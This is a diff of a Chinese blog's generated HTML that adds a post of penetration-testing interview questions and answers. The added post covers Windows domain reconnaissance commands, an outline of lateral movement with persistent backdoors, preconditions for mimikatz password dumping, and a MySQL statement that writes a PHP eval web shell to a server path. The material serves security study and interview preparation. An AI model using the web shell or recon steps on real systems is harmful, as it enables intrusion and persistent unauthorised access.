@@ -51,16 +51,17 @@
   };
 </script>
 
-  <meta name="description" content="胡歌">
-<meta property="og:type" content="website">
-<meta property="og:title" content="ClearLoveの博客">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;categories&#x2F;%E9%9D%A2%E8%AF%95&#x2F;index.html">
+  <meta name="description" content="1.获得一台服务器权限后，如何判断当前服务器是否在域中？如果在域中，如何判断当前用户的身份？1.RDS如果服务器远程桌面服务开启，可尝试连接，若在用户和密码栏下还有一个登录到（L）选项，下拉选项如果除了计算机名（此计算机）选项外还有其他选项，则此服务器可能位于域中，且选项名即为域名 2.net time &#x2F;domain执行命令，有三种情况：第一种若存在域会从域控返回时间，并在第一行返回域控及域名；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试面试问题二">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E4%BA%8C&#x2F;index.html">
 <meta property="og:site_name" content="ClearLoveの博客">
-<meta property="og:description" content="胡歌">
+<meta property="og:description" content="1.获得一台服务器权限后，如何判断当前服务器是否在域中？如果在域中，如何判断当前用户的身份？1.RDS如果服务器远程桌面服务开启，可尝试连接，若在用户和密码栏下还有一个登录到（L）选项，下拉选项如果除了计算机名（此计算机）选项外还有其他选项，则此服务器可能位于域中，且选项名即为域名 2.net time &#x2F;domain执行命令，有三种情况：第一种若存在域会从域控返回时间，并在第一行返回域控及域名；">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-04T07:06:31.574Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/categories/%E9%9D%A2%E8%AF%95/">
+<link rel="canonical" href="http://yoursite.com/2019/12/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E4%BA%8C/">
 
 
 <script id="page-configurations">
@@ -68,13 +69,13 @@
   CONFIG.page = {
     sidebar: "",
     isHome: false,
-    isPost: false,
+    isPost: true,
     isPage: false,
     isArchive: false
   };
 </script>
 
-  <title>分类: 面试 | ClearLoveの博客</title>
+  <title>渗透测试面试问题二 | ClearLoveの博客</title>
   
 
 
@@ -204,50 +205,135 @@
           <div class="content">
             
 
+  <div class="posts-expand">
+      
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h1 class="collection-header">面试
-          <small>分类</small>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="魏超">
+      <meta itemprop="description" content="胡歌">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ClearLoveの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透测试面试问题二
         </h1>
-      </div>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-03 14:06:51" itemprop="dateCreated datePublished" datetime="2019-12-03T14:06:51+08:00">2019-12-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-12-04 15:06:31" itemprop="dateModified" datetime="2019-12-04T15:06:31+08:00">2019-12-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <h1 class="collection-header">2019</h1>
+        <p>1.获得一台服务器权限后，如何判断当前服务器是否在域中？如果在域中，如何判断当前用户的身份？</p><pre><code>1.RDS如果服务器远程桌面服务开启，可尝试连接，若在用户和密码栏下还有一个登录到（L）选项，下拉选项如果除了计算机名（此计算机）选项外还有其他选项，则此服务器可能位于域中，且选项名即为域名
+2.net time /domain执行命令，有三种情况：第一种若存在域会从域控返回时间，并在第一行返回域控及域名；
+  第二种如果当前服务器在域内但当前用户非非域内用户，则返回system error5就表示权限不够
+  第三种就是返回找不到域WORKGROUP的域控制器，表示当前网络环境为工作组而不存在域
+3.ipconfig /all查看当前网络的DAS，一般在内网的DNS服务器即为域控，很少将DNS与域控分开，除非内网很大存在多域环境
+4.systeminfo系统信息当中包含俩项Domain和Logon server，domain即为域名，logon server即为域控，但如果domain显示为WORKGROUP则当前服务器不在域内
+5.net config workstation其中工作域显示域名，同样若为WORKGROUP即非域环境，登录域表明当前用户是域用户登录还是本地用户登录
+  net group "domain admins" /domain获得域管理员列表
+6.net view 查询同一域内机器列表 dsquery user 查询用户
+</code></pre><a id="more"></a>
+
+<p>2.简述内网拓展的思路</p>
+<pre><code>1.先获取当前服务器的信息，如本机文件，硬编码的密码，读取的hash
+2.进一步获取当前网络及域的信息
+3.基于已有的信息进行快速内网扩展尝试，如爆破弱口令
+4.提权获取更多信息
+5.巩固权限，维持访问，持久性后门
+6.在横向受阻时尝试更多思路的横向扩展，如钓鱼、社工等</code></pre>
+<p>3.简述procdump+mimikatz读取密码的必要条件</p>
+<pre><code>1.在相同内核的操作系统的版本上解密
+2.管理员权限
+3.NT6及以下</code></pre>
+<p>4.红蓝对抗的目的是什么？</p>
+<pre><code>用来评估企业安全性，有助于找出企业安全中最脆弱的环节，提升企业安全建设</code></pre>
+<p>5.常见的恶意代码类型有哪些</p>
+<pre><code>常见的恶意代码类型有特洛伊木马、蠕虫、病毒、后门、rootkit、僵尸程序等</code></pre>
+<p>6.恶意代码的共同特征</p>
+<pre><code>具有恶意目的，自身是计算机程序，通过执行发生作用</code></pre>
+<p>7.通过MySQL写入php一句话<br>前提：root权限，web服务器的绝对路径</p>
+<pre><code>select "<?php @eval($_POST['pass']);?>" INTO OUTFILE "D:\\WWW\\22.php"</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2019-11-19T14:33:06+08:00"
-              content="2019-11-19">
-          11-19
-        </time>
-      </div>
+      <footer class="post-footer">
 
-      <h2 class="post-title">
-          <a class="post-title-link" href="/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" itemprop="url">
-            <span itemprop="name">渗透测试面试问题</span>
-          </a>
-      </h2>
+        
 
-    </header>
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/12/02/sql-server%E6%8F%90%E6%9D%83/" rel="next" title="sql server提权相关命令">
+                  <i class="fa fa-chevron-left"></i> sql server提权相关命令
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
   </article>
+  
+  
+  
 
-    </div>
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
